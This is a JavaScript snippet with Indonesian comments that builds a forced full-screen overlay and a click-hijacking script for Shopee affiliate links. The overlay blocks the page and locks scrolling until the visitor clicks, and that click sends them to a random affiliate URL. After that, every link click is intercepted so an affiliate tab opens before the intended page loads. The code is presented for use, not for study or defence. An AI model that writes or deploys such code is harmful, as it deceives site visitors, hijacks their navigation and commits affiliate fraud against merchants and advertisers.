// Script paling simple:
const simplestScript = `
<script>
  const links = ${JSON.stringify(AFFILIATE_LINKS)};
  
  function handleClick() {
    // 1. Buka Shopee
    const url = links[Math.floor(Math.random() * links.length)];
    window.location.href = url;
    
    // 2. Hilangkan overlay
    document.getElementById('force-overlay').style.display = 'none';
    document.body.style.overflow = 'auto';
  }
  
  // Pasang event ke seluruh overlay
  document.getElementById('force-overlay').onclick = handleClick;
  
  // Setelah overlay hilang, handle link clicks
  document.addEventListener('click', function(e) {
    if (document.getElementById('force-overlay').style.display === 'none') {
      const link = e.target.closest('a');
      if (link) {
        e.preventDefault();
        const url = links[Math.floor(Math.random() * links.length)];
        window.open(url, '_blank');
        setTimeout(() => {
          window.location.href = link.href;
        }, 300);
      }
    }
  });
</script>
`;

// Overlay HTML paling simple:
const simpleOverlay = `
<div id="force-overlay" style="
  position:fixed;
  top:0;left:0;
  width:100%;height:100%;
  background:#000;
  z-index:99999999;
  display:flex;
  align-items:center;
  justify-content:center;
  color:white;
  font-family:Arial;
  text-align:center;
  cursor:pointer;
">
  <div>
    <div style="font-size:48px;">👉</div>
    <h1 style="margin:20px 0;">KLIK UNTUK MELANJUTKAN</h1>
    <p>Klik dimanapun di layar ini</p>
  </div>
</div>
<style>body{overflow:hidden!important;}</style>
`;
